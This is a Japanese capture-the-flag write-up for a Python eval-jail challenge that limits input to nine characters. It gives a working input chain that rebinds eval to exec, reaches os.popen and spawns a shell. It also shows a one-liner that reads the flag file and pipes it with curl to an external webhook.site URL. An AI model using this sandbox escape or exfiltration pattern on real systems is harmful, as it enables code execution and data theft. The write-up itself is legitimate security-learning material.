# 9️⃣

https://alpacahack.com/daily-bside/challenges/9

## 問題の概要

Python で `(`, `)`, `[`, `]` を含まない文字列を入力すると先頭の 9 文字が `eval` されます。

9 回以内に `flag.txt` の内容を出力させればクリアです。

## 解法

`{a:=1}` のようにすることで `eval` 内で `a` に代入を行うことができることまでは分かったのですが、行き詰ってしまったので他の方の Writeup を薄目で見させてもらいました。

`eval` 自体に実行したい関数を代入すれば、参照可能な関数に文字列の引数を渡して実行することができます。

まずは `eval` を `exec` に置き換えて Python 文を実行できるようにします。

```python
print(eval("{e:=exec}"))
print(eval("{eval:=e}"))
```

2 文字のモジュールまでインポート可能で、5 文字の関数まで呼び出すことができます。

`os.popen` で任意のコマンドを実行することはできるのですが、起動したプロセスの標準出力を読み取ることができません。

```python
print(eval("import os"))
print(eval("o=os"))
print(eval("f=o.popen"))
print(eval("eval=f"))
print(eval("cat /f*")) # => <os._wrap_close object at 0x7c93ca8770e0>
```

`/proc/$(pidof python)/fd/1` などへのリダイレクトも試してみましたがうまくいかず、困ってしまいました。

少し正攻法から外れますが、`sh` を起動して入力文字数制限を回避し、`curl` で外部にデータを送信することにしました。

[webhook.site](https://webhook.site/) を使用すると、発行された URL にアクセスしたリクエストの内容を確認することができます。

## 解答に使用した入力

```
{e:=exec}
{eval:=e}
import os
o=os
f=o.popen
eval=f
sh
cat /flag* | curl -d @- https://webhook.site/********-****-****-****-************
```

## 出力を得る方法について

`>&0` にリダイレクトすることで、`socat` 経由でクライアントに出力を返すことができるようです。なんで？

```sh
sh
cat /flag* >&0
# => Alpaca{**************}
```
